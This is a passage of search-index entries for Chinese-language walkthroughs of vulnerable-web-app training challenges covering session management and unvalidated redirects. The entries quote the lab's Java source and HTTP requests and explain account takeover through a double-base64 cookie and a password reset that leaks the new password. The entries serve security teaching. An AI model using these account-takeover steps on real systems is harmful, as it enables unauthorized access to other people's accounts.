/src/main/java/servlets/module/challenge/SessionManagement3.java Object nameObj = request.getParameter(\"subUserName\"); //\u83b7\u5f97\u7528\u6237\u540d Object passObj = request.getParameter(\"subUserPassword\"); //\u83b7\u5f97\u5bc6\u7801 String subName = new String(); String subPass = new String(); String userAddress = new String(); if(nameObj != null) subName = (String) nameObj; if(passObj != null) subPass = (String) passObj; log.debug(\"subName = \" + subName); log.debug(\"subPass = \" + subPass); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalThree\"); //\u8fde\u63a5 BrokenAuthAndSessMangChalThree \u6570\u636e\u5e93 log.debug(\"Checking credentials\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress, userRole FROM users WHERE userName = ?\"); //\u67e5\u8be2\u7528\u6237\u540d \u5224\u65ad\u7528\u6237\u89d2\u8272\u662f\u5426\u662f admin callstmt.setString(1, subName); log.debug(\"Executing findUser\"); ResultSet resultSet = callstmt.executeQuery(); if(resultSet.next()) { log.debug(\"User found\"); if(resultSet.getString(3).equalsIgnoreCase(\"admin\")) { log.debug(\"Admin Detected\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress, userRole FROM users WHERE userName = ? AND userPassword = SHA(?)\"); //\u8fdb\u800c\u5224\u65ad\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u6b63\u786e callstmt.setString(1, subName); callstmt.setString(2, subPass); log.debug(\"Executing authUser\"); ResultSet resultSet2 = callstmt.executeQuery(); if(resultSet2.next()) { log.debug(\"Successful Admin Login\"); // Get key and add it to the output \u4ece\u5b9e\u73b0\u4e0a\u6765\u770b\uff0c\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u6f0f\u6d1e\uff0c\u6570\u636e\u5e93\u67e5\u8be2\u662f\u9884\u7f16\u8bd1\u7684 \u754c\u9762\u4e0a\u8fd8\u6709\u4e2a\u529f\u80fd\uff0c\u662f\u4fee\u6539\u5bc6\u7801\uff0c\u731c\u6d4b\u53ef\u80fd\u662f\u8fd9\u4e2a\u5730\u65b9\u6709\u95ee\u9898 POST /challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; JSESSIONID=A2479A1D9F44509E20B35106989DFFAF; token=22792033228396859635296159069930202705 newPassword=test1%40qq.com \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/SessionManagement3ChangePassword.java Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"current\") == 0) //\u83b7\u5f97cookie\u4e2d\u7684current\u5b57\u6bb5\u503c { theCookie = userCookies[i]; break; //End Loop, because we found the token } } Object passNewObj = request.getParameter(\"newPassword\"); String subName = new String(); String subNewPass = new String(); if(theCookie != null) subName = theCookie.getValue(); if(passNewObj != null) subNewPass = (String) passNewObj; log.debug(\"subName = \" + subName); //Base 64 Decode try { byte[] decodedName = Base64.decodeBase64(subName); // current\u8fdb\u884c\u4e24\u6b21base64\u89e3\u7801 subName = new String(decodedName, \"UTF-8\"); decodedName = Base64.decodeBase64(subName); subName = new String(decodedName, \"UTF-8\"); } if(subNewPass.length() >= 6) //\u65b0\u5bc6\u7801\u957f\u5ea6 \u8981\u5927\u4e8e\u7b49\u4e8e6\u4f4d { log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalThree\"); log.debug(\"Changing password for user: \" + subName); log.debug(\"Changing password to: \" + subNewPass); PreparedStatement callstmt; callstmt = conn.prepareStatement(\"UPDATE users SET userPassword = SHA(?) WHERE userName = ?\"); //\u66f4\u65b0\u7528\u6237\u540d(\u6765\u6e90cookie)\u548c\u5bc6\u7801 callstmt.setString(1, subNewPass); callstmt.setString(2, subName); log.debug(\"Executing changePassword\"); callstmt.execute(); \u89e3\u9898\u6b65\u9aa4 \u00b6 \u901a\u8fc7\u4fee\u6539\u5bc6\u7801\u529f\u80fd\uff0c\u4fee\u6539cookie\u4e2d\u7684current\u503c\u4e3aadmin \u603b\u7ed3 \u00b6 \u6c38\u8fdc\u4e0d\u80fd\u4fe1\u4efb\u5ba2\u6237\u7aef\u4f20\u9012\u7684\u6570\u636e\uff0c\u4f7f\u7528\u5f3a\u52a0\u5bc6\u66ff\u4ee3base64\u7f16\u7801\u7b49","title":"Session Management Challenge Three(\u4f1a\u8bdd\u7ba1\u7406 3)"},{"location":"vul/Session-Management-Challenge-Three.html#session-management-challenge-three-3","text":"","title":"Session Management Challenge Three(\u4f1a\u8bdd\u7ba1\u7406 3)"},{"location":"vul/Session-Management-Challenge-Three.html#_1","text":"\u9700\u8981\u8f93\u5165\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Session-Management-Challenge-Three.html#_2","text":"\u8f93\u5165\u4efb\u610f\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u70b9\u51fb\u63d0\u4ea4 POST /challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3 HTTP/1.1 subUserName=admin&subUserPassword=password \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 /src/main/java/servlets/module/challenge/SessionManagement3.java Object nameObj = request.getParameter(\"subUserName\"); //\u83b7\u5f97\u7528\u6237\u540d Object passObj = request.getParameter(\"subUserPassword\"); //\u83b7\u5f97\u5bc6\u7801 String subName = new String(); String subPass = new String(); String userAddress = new String(); if(nameObj != null) subName = (String) nameObj; if(passObj != null) subPass = (String) passObj; log.debug(\"subName = \" + subName); log.debug(\"subPass = \" + subPass); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalThree\"); //\u8fde\u63a5 BrokenAuthAndSessMangChalThree \u6570\u636e\u5e93 log.debug(\"Checking credentials\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress, userRole FROM users WHERE userName = ?\"); //\u67e5\u8be2\u7528\u6237\u540d \u5224\u65ad\u7528\u6237\u89d2\u8272\u662f\u5426\u662f admin callstmt.setString(1, subName); log.debug(\"Executing findUser\"); ResultSet resultSet = callstmt.executeQuery(); if(resultSet.next()) { log.debug(\"User found\"); if(resultSet.getString(3).equalsIgnoreCase(\"admin\")) { log.debug(\"Admin Detected\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress, userRole FROM users WHERE userName = ? AND userPassword = SHA(?)\"); //\u8fdb\u800c\u5224\u65ad\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u6b63\u786e callstmt.setString(1, subName); callstmt.setString(2, subPass); log.debug(\"Executing authUser\"); ResultSet resultSet2 = callstmt.executeQuery(); if(resultSet2.next()) { log.debug(\"Successful Admin Login\"); // Get key and add it to the output \u4ece\u5b9e\u73b0\u4e0a\u6765\u770b\uff0c\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u6f0f\u6d1e\uff0c\u6570\u636e\u5e93\u67e5\u8be2\u662f\u9884\u7f16\u8bd1\u7684 \u754c\u9762\u4e0a\u8fd8\u6709\u4e2a\u529f\u80fd\uff0c\u662f\u4fee\u6539\u5bc6\u7801\uff0c\u731c\u6d4b\u53ef\u80fd\u662f\u8fd9\u4e2a\u5730\u65b9\u6709\u95ee\u9898 POST /challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; JSESSIONID=A2479A1D9F44509E20B35106989DFFAF; token=22792033228396859635296159069930202705 newPassword=test1%40qq.com \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/SessionManagement3ChangePassword.java Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"current\") == 0) //\u83b7\u5f97cookie\u4e2d\u7684current\u5b57\u6bb5\u503c { theCookie = userCookies[i]; break; //End Loop, because we found the token } } Object passNewObj = request.getParameter(\"newPassword\"); String subName = new String(); String subNewPass = new String(); if(theCookie != null) subName = theCookie.getValue(); if(passNewObj != null) subNewPass = (String) passNewObj; log.debug(\"subName = \" + subName); //Base 64 Decode try { byte[] decodedName = Base64.decodeBase64(subName); // current\u8fdb\u884c\u4e24\u6b21base64\u89e3\u7801 subName = new String(decodedName, \"UTF-8\"); decodedName = Base64.decodeBase64(subName); subName = new String(decodedName, \"UTF-8\"); } if(subNewPass.length() >= 6) //\u65b0\u5bc6\u7801\u957f\u5ea6 \u8981\u5927\u4e8e\u7b49\u4e8e6\u4f4d { log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalThree\"); log.debug(\"Changing password for user: \" + subName); log.debug(\"Changing password to: \" + subNewPass); PreparedStatement callstmt; callstmt = conn.prepareStatement(\"UPDATE users SET userPassword = SHA(?) WHERE userName = ?\"); //\u66f4\u65b0\u7528\u6237\u540d(\u6765\u6e90cookie)\u548c\u5bc6\u7801 callstmt.setString(1, subNewPass); callstmt.setString(2, subName); log.debug(\"Executing changePassword\"); callstmt.execute();","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Session-Management-Challenge-Three.html#_3","text":"\u901a\u8fc7\u4fee\u6539\u5bc6\u7801\u529f\u80fd\uff0c\u4fee\u6539cookie\u4e2d\u7684current\u503c\u4e3aadmin","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Session-Management-Challenge-Three.html#_4","text":"\u6c38\u8fdc\u4e0d\u80fd\u4fe1\u4efb\u5ba2\u6237\u7aef\u4f20\u9012\u7684\u6570\u636e\uff0c\u4f7f\u7528\u5f3a\u52a0\u5bc6\u66ff\u4ee3base64\u7f16\u7801\u7b49","title":"\u603b\u7ed3"},{"location":"vul/Session-Management-Challenge-Two.html","text":"Session Management Challenge Two(\u4f1a\u8bdd\u7ba1\u7406 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u8f93\u5165\u7ba1\u7406\u5458\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8f93\u5165\u7cfb\u7edf\u9ed8\u8ba4\u7684\u8d26\u53f7\u548c\u5bc6\u7801(admin/password)\u53d1\u73b0\u65e0\u6cd5\u767b\u9646 \uff0c\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/d779e34a54172cbc245300d3bc22937090ebd3769466a501a5e7ac605b9f34b7 HTTP/1.1 subName=admin&subPassword=password \u67e5\u770b\u540e\u53f0\u4ee3\u7801 \u5728 src/main/java/servlets/module/challenge/SessionManagement2.java \u4e2d \u8be6\u7ec6\u4ee3\u7801\u5982\u4e0b: Object nameObj = request.getParameter(\"subName\"); Object passObj = request.getParameter(\"subPassword\"); String subName = new String(); String subPass = new String(); String userAddress = new String(); if(nameObj != null) subName = (String) nameObj; if(passObj != null) subPass = (String) passObj; log.debug(\"subName = \" + subName); log.debug(\"subPass = \" + subPass); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalTwo\"); log.debug(\"Checking credentials\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress FROM users WHERE userName = ? AND userPassword = SHA(?)\"); callstmt.setString(1, subName); callstmt.setString(2, subPass); log.debug(\"Executing authUser\"); \u53d1\u73b0\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1SQL\u67e5\u8be2\uff0c\u675c\u7edd\u4e86SQL\u6ce8\u5165\u95ee\u9898 \uff0c\u540c\u65f6\u8fde\u63a5\u7684BrokenAuthAndSessMangChalTwo\u6570\u636e\u5e93\uff0c\u6240\u4ee5\u8fd9\u4e2a\u70b9\u6ca1\u6709\u8d26\u53f7\u548c\u5bc6\u7801\u65e0\u6cd5\u9a8c\u8bc1\u901a\u8fc7 \u7ee7\u7eed\u67e5\u770b\u4ee3\u7801 ResultSet resultSet = callstmt.executeQuery(); if(resultSet.next()) { log.debug(\"Successful Login\"); // Get key and add it to the output String userKey = Hash.generateUserSolution(Getter.getModuleResultFromHash(ApplicationRoot, levelHash), (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.welcome\") + \" \" + Encode.forHtml(resultSet.getString(1)) + \"</h2>\" + \"<p>\" + bundle.getString(\"response.resultKey\") + \" <a>\" + userKey + \"</a>\" + \"</p>\"; } else { //\u67e5\u8be2\u5931\u8d25\u540e\uff0c\u901a\u8fc7\u7528\u6237\u540d\u67e5\u8be2\u7528\u6237\u7684\u90ae\u7bb1\u5730\u5740 log.debug(\"Incorrect credentials, checking if user name correct\"); callstmt = conn.prepareStatement(\"SELECT userAddress FROM users WHERE userName = ?\"); callstmt.setString(1, subName); log.debug(\"Executing getAddress\"); resultSet = callstmt.executeQuery(); if(resultSet.next()) //\u627e\u5230\u90ae\u7bb1 \u5219\u8fd4\u56de\u5230\u524d\u7aef { log.debug(\"User Found\"); userAddress = bundle.getString(\"response.badPass\") + \" <a>\" + Encode.forHtml(resultSet.getString(1)) + \"</a><br/>\"; } else { userAddress = bundle.getString(\"response.badUser\") + \"<br/>\"; } htmlOutput = makeTable(userAddress, bundle); } Database.closeConnection(conn); \u5982\u679c\u7528\u6237\u540d\u5b58\u5728\uff0c\u5219\u4f1a\u8fd4\u56de\u5bf9\u5e94\u90ae\u7bb1\u5730\u5740\u5230\u524d\u7aef\u5c55\u793a \u540c\u65f6\u524d\u7aef\u8fd8\u6709\u4e2a\u529f\u80fd\uff0c\u53ef\u4ee5\u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u7528\u6237\u7684\u5bc6\u7801 \u8bf7\u6c42\u5730\u5740 POST /challenges/f5ddc0ed2d30e597ebacf5fdd117083674b19bb92ffc3499121b9e6a12c92959 HTTP/1.1 subEmail=zoidberg22%40shepherd.com \u5bf9\u5e94\u529f\u80fd \u529f\u80fd\u5728 src/main/java/servlets/module/challenge/SessionManagement2ChangePassword.java \u4e2d Object emailObj = request.getParameter(\"subEmail\"); String subEmail = new String(); if(emailObj != null) subEmail = (String) emailObj; log.debug(\"subEmail = \" + subEmail); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); String newPassword = Hash.randomString(); //\u968f\u673a\u751f\u6210\u65b0\u5bc6\u7801 try { Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalTwo\"); log.debug(\"Checking credentials\"); PreparedStatement callstmt = conn.prepareStatement(\"UPDATE users SET userPassword = SHA(?) WHERE userAddress = ?\"); //\u6839\u636e\u90ae\u7bb1\u91cd\u7f6e\u5bc6\u7801 callstmt.setString(1, newPassword); callstmt.setString(2, subEmail); log.debug(\"Executing resetPassword\"); callstmt.execute(); log.debug(\"Statement executed\"); log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); htmlOutput = Encode.forHtml(newPassword); //\u7f16\u7801\u65b0\u5bc6\u7801 Database.closeConnection(conn); } catch(SQLException e) { log.error(levelName + \" SQL Error: \" + e.toString()); } log.debug(\"Outputting HTML\"); out.write(bundle.getString(\"response.changedTo\") + \" \" + htmlOutput); //\u8f93\u51fa\u5bc6\u7801\u5230\u5ba2\u6237\u7aef \u4f7f\u7528\u9884\u7f16\u8bd1\u6839\u636e\u90ae\u7bb1\u5730\u5740\u91cd\u7f6e\u7528\u6237\u5bc6\u7801\uff0c\u5e76\u4e14\u5c06\u65b0\u751f\u6210\u7684\u5bc6\u7801\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u8fdb\u884c\u5c55\u793a \u89e3\u9898\u6b65\u9aa4 \u00b6 \u8f93\u5165\u9519\u8bef\u7684\u5bc6\u7801\uff0c\u53ef\u4ee5\u83b7\u5f97\u7528\u6237\u7684\u6ce8\u518c\u90ae\u7bb1 \u901a\u8fc7\u4f7f\u7528\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\u529f\u80fd\uff0c\u83b7\u5f97\u6700\u65b0\u751f\u6210\u7684\u65b0\u5bc6\u7801 \u4f7f\u7528\u65b0\u5bc6\u7801\u767b\u5f55\uff0c\u5373\u53ef\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u603b\u7ed3 \u00b6 \u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u7684\u5185\u5bb9\u4e00\u5b9a\u8981\u4e25\u683c\u8fdb\u884c\u6821\u9a8c\uff0c\u9632\u6b62\u5c06\u654f\u611f\u4fe1\u606f\u8fd4\u56de\u5230\u5ba2\u6237\u7aef","title":"Session Management Challenge Two(\u4f1a\u8bdd\u7ba1\u7406 2)"},{"location":"vul/Session-Management-Challenge-Two.html#session-management-challenge-two-2","text":"","title":"Session Management Challenge Two(\u4f1a\u8bdd\u7ba1\u7406 2)"},{"location":"vul/Session-Management-Challenge-Two.html#_1","text":"\u9700\u8981\u8f93\u5165\u7ba1\u7406\u5458\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Session-Management-Challenge-Two.html#_2","text":"\u8f93\u5165\u7cfb\u7edf\u9ed8\u8ba4\u7684\u8d26\u53f7\u548c\u5bc6\u7801(admin/password)\u53d1\u73b0\u65e0\u6cd5\u767b\u9646 \uff0c\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/d779e34a54172cbc245300d3bc22937090ebd3769466a501a5e7ac605b9f34b7 HTTP/1.1 subName=admin&subPassword=password \u67e5\u770b\u540e\u53f0\u4ee3\u7801 \u5728 src/main/java/servlets/module/challenge/SessionManagement2.java \u4e2d \u8be6\u7ec6\u4ee3\u7801\u5982\u4e0b: Object nameObj = request.getParameter(\"subName\"); Object passObj = request.getParameter(\"subPassword\"); String subName = new String(); String subPass = new String(); String userAddress = new String(); if(nameObj != null) subName = (String) nameObj; if(passObj != null) subPass = (String) passObj; log.debug(\"subName = \" + subName); log.debug(\"subPass = \" + subPass); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalTwo\"); log.debug(\"Checking credentials\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress FROM users WHERE userName = ? AND userPassword = SHA(?)\"); callstmt.setString(1, subName); callstmt.setString(2, subPass); log.debug(\"Executing authUser\"); \u53d1\u73b0\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1SQL\u67e5\u8be2\uff0c\u675c\u7edd\u4e86SQL\u6ce8\u5165\u95ee\u9898 \uff0c\u540c\u65f6\u8fde\u63a5\u7684BrokenAuthAndSessMangChalTwo\u6570\u636e\u5e93\uff0c\u6240\u4ee5\u8fd9\u4e2a\u70b9\u6ca1\u6709\u8d26\u53f7\u548c\u5bc6\u7801\u65e0\u6cd5\u9a8c\u8bc1\u901a\u8fc7 \u7ee7\u7eed\u67e5\u770b\u4ee3\u7801 ResultSet resultSet = callstmt.executeQuery(); if(resultSet.next()) { log.debug(\"Successful Login\"); // Get key and add it to the output String userKey = Hash.generateUserSolution(Getter.getModuleResultFromHash(ApplicationRoot, levelHash), (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.welcome\") + \" \" + Encode.forHtml(resultSet.getString(1)) + \"</h2>\" + \"<p>\" + bundle.getString(\"response.resultKey\") + \" <a>\" + userKey + \"</a>\" + \"</p>\"; } else { //\u67e5\u8be2\u5931\u8d25\u540e\uff0c\u901a\u8fc7\u7528\u6237\u540d\u67e5\u8be2\u7528\u6237\u7684\u90ae\u7bb1\u5730\u5740 log.debug(\"Incorrect credentials, checking if user name correct\"); callstmt = conn.prepareStatement(\"SELECT userAddress FROM users WHERE userName = ?\"); callstmt.setString(1, subName); log.debug(\"Executing getAddress\"); resultSet = callstmt.executeQuery(); if(resultSet.next()) //\u627e\u5230\u90ae\u7bb1 \u5219\u8fd4\u56de\u5230\u524d\u7aef { log.debug(\"User Found\"); userAddress = bundle.getString(\"response.badPass\") + \" <a>\" + Encode.forHtml(resultSet.getString(1)) + \"</a><br/>\"; } else { userAddress = bundle.getString(\"response.badUser\") + \"<br/>\"; } htmlOutput = makeTable(userAddress, bundle); } Database.closeConnection(conn); \u5982\u679c\u7528\u6237\u540d\u5b58\u5728\uff0c\u5219\u4f1a\u8fd4\u56de\u5bf9\u5e94\u90ae\u7bb1\u5730\u5740\u5230\u524d\u7aef\u5c55\u793a \u540c\u65f6\u524d\u7aef\u8fd8\u6709\u4e2a\u529f\u80fd\uff0c\u53ef\u4ee5\u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u7528\u6237\u7684\u5bc6\u7801 \u8bf7\u6c42\u5730\u5740 POST /challenges/f5ddc0ed2d30e597ebacf5fdd117083674b19bb92ffc3499121b9e6a12c92959 HTTP/1.1 subEmail=zoidberg22%40shepherd.com \u5bf9\u5e94\u529f\u80fd \u529f\u80fd\u5728 src/main/java/servlets/module/challenge/SessionManagement2ChangePassword.java \u4e2d Object emailObj = request.getParameter(\"subEmail\"); String subEmail = new String(); if(emailObj != null) subEmail = (String) emailObj; log.debug(\"subEmail = \" + subEmail); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); String newPassword = Hash.randomString(); //\u968f\u673a\u751f\u6210\u65b0\u5bc6\u7801 try { Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalTwo\"); log.debug(\"Checking credentials\"); PreparedStatement callstmt = conn.prepareStatement(\"UPDATE users SET userPassword = SHA(?) WHERE userAddress = ?\"); //\u6839\u636e\u90ae\u7bb1\u91cd\u7f6e\u5bc6\u7801 callstmt.setString(1, newPassword); callstmt.setString(2, subEmail); log.debug(\"Executing resetPassword\"); callstmt.execute(); log.debug(\"Statement executed\"); log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); htmlOutput = Encode.forHtml(newPassword); //\u7f16\u7801\u65b0\u5bc6\u7801 Database.closeConnection(conn); } catch(SQLException e) { log.error(levelName + \" SQL Error: \" + e.toString()); } log.debug(\"Outputting HTML\"); out.write(bundle.getString(\"response.changedTo\") + \" \" + htmlOutput); //\u8f93\u51fa\u5bc6\u7801\u5230\u5ba2\u6237\u7aef \u4f7f\u7528\u9884\u7f16\u8bd1\u6839\u636e\u90ae\u7bb1\u5730\u5740\u91cd\u7f6e\u7528\u6237\u5bc6\u7801\uff0c\u5e76\u4e14\u5c06\u65b0\u751f\u6210\u7684\u5bc6\u7801\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u8fdb\u884c\u5c55\u793a","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Session-Management-Challenge-Two.html#_3","text":"\u8f93\u5165\u9519\u8bef\u7684\u5bc6\u7801\uff0c\u53ef\u4ee5\u83b7\u5f97\u7528\u6237\u7684\u6ce8\u518c\u90ae\u7bb1 \u901a\u8fc7\u4f7f\u7528\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\u529f\u80fd\uff0c\u83b7\u5f97\u6700\u65b0\u751f\u6210\u7684\u65b0\u5bc6\u7801 \u4f7f\u7528\u65b0\u5bc6\u7801\u767b\u5f55\uff0c\u5373\u53ef\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Session-Management-Challenge-Two.html#_4","text":"\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u7684\u5185\u5bb9\u4e00\u5b9a\u8981\u4e25\u683c\u8fdb\u884c\u6821\u9a8c\uff0c\u9632\u6b62\u5c06\u654f\u611f\u4fe1\u606f\u8fd4\u56de\u5230\u5ba2\u6237\u7aef","title":"\u603b\u7ed3"},{"location":"vul/Unvalidated-Redirects-and-Forwards.html","text":"Unvalidated Redirects and Forwards(\u672a\u9a8c\u8bc1\u7684\u91cd\u5b9a\u5411\u548c\u8f6c\u53d1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u6784\u9020\u4e00\u4e2aurl\u91cd\u5b9a\u5411/\u8f6c\u53d1\u7684\u529f\u80fd,\u901a\u8fc7\u63d0\u4ea4\u4e00\u4e2aURL,\u8fdb\u800c\u8df3\u8f6c\u5230\u53e6\u4e00\u4e2aURL\u5730\u5740 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb \u53d1\u9001\u4fe1\u606f \u6309\u94ae\uff0c\u6293\u53d6\u5230\u6570\u636e\u5305 POST /lessons/f15f2766c971e16e68aa26043e6016a0a7f6879283c873d9476a8e7e94ea736f HTTP/1.1 messageForAdmin=dd&csrfToken=57966045510818911837005793670200998761 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5728\u6587\u4ef6: src/main/java/servlets/module/lesson/UnvalidatedForwardsLesson.java \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b: String messageForAdmin = request.getParameter(\"messageForAdmin\").toLowerCase(); log.debug(\"User Submitted - \" + messageForAdmin); String htmlOutput = new String(); boolean validUrl = true; boolean validSolution = false; boolean validAttack = false; try { URL csrfUrl = new URL(messageForAdmin); log.debug(\"Url Host: \" + csrfUrl.getHost()); log.debug(\"Url Port: \" + csrfUrl.getPort()); log.debug(\"Url Path: \" + csrfUrl.getPath()); log.debug(\"Url Query: \" + csrfUrl.getQuery()); validSolution = csrfUrl.getPath().toLowerCase().equalsIgnoreCase(\"/user/redirect\"); if(!validSolution) log.debug(\"Invalid Solution: Bad Path or Above\"); validSolution = csrfUrl.getQuery().toLowerCase().startsWith((\"to=\").toLowerCase()) && validSolution; if(!validSolution) log.debug(\"Invalid Solution: Bad Query or Above\"); if(validSolution) { log.debug(\"Redirect URL Correct: Now checking the Redirected URL for valid CSRF Attack\"); int csrfStart = 0; int csrfEnd = 0; csrfStart = csrfUrl.getQuery().indexOf(\"to=\") + 3; csrfEnd = csrfUrl.getQuery().indexOf(\"&\"); if(csrfEnd == -1) { csrfEnd = csrfUrl.getQuery().length(); } String csrfAttack = csrfUrl.getQuery().substring(csrfStart, csrfEnd); log.debug(\"csrfAttack Found to be: \" + csrfAttack); validAttack = FindXSS.findCsrfAttackUrl(csrfAttack, \"/root/grantComplete/unvalidatedredirectlesson\", \"userId\", tempId); messageForAdmin\u53c2\u6570\u83b7\u5f97\u5230\u4e00\u4e2a\u5b8c\u6574url\u5730\u5740\uff0c\u7ecf\u8fc7URL\u7c7b\u8fdb\u884c\u89e3\u6790\uff0c\u5224\u65ad\u8def\u5f84\u662f\u5426\u662f /usr/redirect ,\u63d0\u53d6\u63d0\u4ea4\u8def\u5f84\u7684to\u53c2\u6570\u503c\uff0c\u901a\u8fc7FindXSS.findCsrfAttackUrl \u8fdb\u4e00\u6b65\u8fdb\u884c\u5224\u65ad\u8def\u5f84\u548cuserId\u7b49\u53c2\u6570 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u672c\u9898\u6bd4\u8f83\u7b80\u5355\uff0c\u6784\u9020\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u5408\u6cd5url\u5373\u53ef \u603b\u7ed3 \u00b6 \u5bf9\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684URL\u5730\u5740\u8981\u8fdb\u884c\u4e25\u683c\u6821\u9a8c\uff0c\u5426\u5219\u5f88\u5bb9\u6613\u51fa\u73b0\u8df3\u8f6c\u5230\u4efb\u610f\u7b2c\u4e09\u65b9\u5730\u5740","title":"Unvalidated Redirects and Forwards(\u672a\u9a8c\u8bc1\u7684\u91cd\u5b9a\u5411\u548c\u8f6c\u53d1)"},{"location":"vul/Unvalidated-Redirects-and-Forwards.html#unvalidated-redirects-and-forwards","text":"","title":"Unvalidated Redirects and 